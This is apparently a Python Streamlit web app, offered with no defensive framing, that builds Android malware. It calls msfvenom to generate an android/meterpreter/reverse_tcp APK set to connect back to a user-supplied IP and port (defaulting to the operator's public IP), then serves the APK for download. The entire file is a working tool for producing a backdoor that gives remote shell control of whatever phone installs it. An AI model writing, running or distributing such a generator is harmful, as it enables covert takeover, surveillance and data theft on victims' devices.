import streamlit as st
import subprocess
import time
import base64
import os
import re
import requests

def is_valid_ip(ip):
    # Simple regex-based IP address validation
    return bool(re.match(r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", ip))

def generate_payload(ip, port, output_file):
    if not is_valid_ip(ip):
        st.error("Invalid IP address format.")
        return
    
    if not output_file:
        output_file = "payload"

    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {output_file}.apk"
    
    progress_text = st.empty()
    progress_text.write("Building payload...")

    try:
        subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        progress_text.success("Payload generated successfully!")
        st.download_button(label="Download Payload", data=open(output_file + ".apk", "rb").read(), file_name=output_file + ".apk")
        # Clean up the generated APK file
        os.remove(f"{output_file}.apk")
    except subprocess.CalledProcessError as e:
        st.error(f"Error: {e}")
    except Exception as ex:
        st.error(f"An error occurred: {ex}")

st.title("Android Reverse TCP Payload Generator")

public_ip = requests.get('https://api.ipify.org').text
ip = st.text_input("Enter IP Address:", value=public_ip)
port = st.number_input("Enter Port:", min_value=1, max_value=65535, value=8080)
output_file = "payload"

if st.button("Generate Payload"):
    generate_payload(ip, port, output_file)
